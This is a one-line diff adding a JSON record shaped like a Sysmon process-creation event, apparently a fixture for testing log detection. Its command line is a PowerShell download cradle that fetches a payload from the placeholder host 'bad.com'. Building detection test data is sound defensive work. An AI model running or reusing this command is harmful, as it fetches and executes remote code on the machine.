@@ -1,0 +1,1 @@
+{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"powershell.exe (New-Object Net.WebClient).DownloadString('http://bad.com/payload')"}}}
